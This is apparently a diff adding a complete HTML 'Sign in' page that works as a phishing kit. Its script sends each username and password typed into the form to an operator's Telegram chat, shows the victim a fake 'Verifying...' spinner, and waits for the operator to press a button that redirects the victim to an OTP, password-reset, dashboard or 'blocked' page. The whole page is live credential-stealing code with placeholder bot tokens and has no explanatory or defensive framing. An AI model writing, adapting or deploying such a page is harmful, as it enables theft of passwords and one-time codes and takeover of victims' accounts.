@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Login</title>
+  <style>
+    body { font-family: sans-serif; display:flex; justify-content:center; 
+           align-items:center; height:100vh; background:#111; color:#fff; }
+    .box { background:#222; padding:30px; border-radius:10px; width:300px; }
+    input, button { width:100%; padding:10px; margin:8px 0; border-radius:6px; 
+                    border:none; box-sizing:border-box; }
+    button { background:#0088cc; color:#fff; cursor:pointer; }
+    .spinner { border:4px solid #444; border-top:4px solid #fff; border-radius:50%;
+               width:36px; height:36px; animation:spin 1s linear infinite; 
+               margin:20px auto; display:none; }
+    @keyframes spin { to { transform: rotate(360deg); } }
+  </style>
+</head>
+<body>
+<div class="box">
+  <div id="form">
+    <h2>Sign in</h2>
+    <input id="user" placeholder="Username">
+    <input id="pass" type="password" placeholder="Password">
+    <button onclick="submitLogin()">Login</button>
+  </div>
+
+  <div id="waiting" style="display:none; text-align:center;">
+    <p>Verifying...</p>
+    <div class="spinner"></div>
+  </div>
+</div>
+
+<script>
+const BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";
+const CHAT_ID   = "YOUR_CHAT_ID_HERE";
+
+// Route map — button label -> page URL
+const ROUTES = {
+  "otp":      "otp.html",
+  "forgot":   "forgot.html",
+  "login":    "login.html",
+  "success":  "dashboard.html",
+  "block":    "blocked.html"
+};
+
+let pollTimer = null;
+
+async function submitLogin() {
+  const user = document.getElementById("user").value;
+  const pass = document.getElementById("pass").value;
+
+  // Hide form, show spinner
+  document.getElementById("form").style.display = "none";
+  document.getElementById("waiting").style.display = "block";
+
+  // Build the inline keyboard
+  const keyboard = {
+    inline_keyboard: [
+      [{ text: "🔐 Send OTP Page",    callback_data: "otp"    }],
+      [{ text: "🔑 Forgot Password",  callback_data: "forgot" }],
+      [{ text: "↩️ Back to Login",    callback_data: "login"  }],
+      [{ text: "✅ Send to Dashboard",callback_data: "success"}],
+      [{ text: "🚫 Block User",       callback_data: "block"  }]
+    ]
+  };
+
+  // Get the offset first so we only react to NEW updates
+  const meResp = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=-1`);
+  const meData = await meResp.json();
+  const lastId = meData.result.length ? meData.result[meData.result.length-1].update_id : 0;
+
+  // Send login details + buttons
+  const text = `🔔 *New Login Attempt*\n\n👤 User: \`${user}\`\n🔑 Pass: \`${pass}\`\n\nChoose next page:`;
+  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+    method: "POST",
+    headers: {"Content-Type":"application/json"},
+    body: JSON.stringify({
+      chat_id: CHAT_ID,
+      text: text,
+      parse_mode: "Markdown",
+      reply_markup: keyboard
+    })
+  });
+
+  // Start polling for the button press
+  pollForDecision(lastId + 1);
+}
+
+function pollForDecision(offset) {
+  pollTimer = setInterval(async () => {
+    try {
+      const r = await fetch(
+        `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${offset}&timeout=5`
+      );
+      const data = await r.json();
+
+      for (const upd of data.result) {
+        offset = upd.update_id + 1;
+
+        if (upd.callback_query) {
+          const choice = upd.callback_query.data;
+          const target = ROUTES[choice] || "login.html";
+
+          // Acknowledge the button press (removes loading spinner on Telegram)
+          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
+            method: "POST",
+            headers: {"Content-Type":"application/json"},
+            body: JSON.stringify({
+              callback_query_id: upd.callback_query.id,
+              text: "Redirecting user..."
+            })
+          });
+
+          // Redirect the user
+          clearInterval(pollTimer);
+          window.location.href = target;
+          return;
+        }
+      }
+    } catch(e) { console.error(e); }
+  }, 2000);
+}
+</script>
+</body>
+</html>
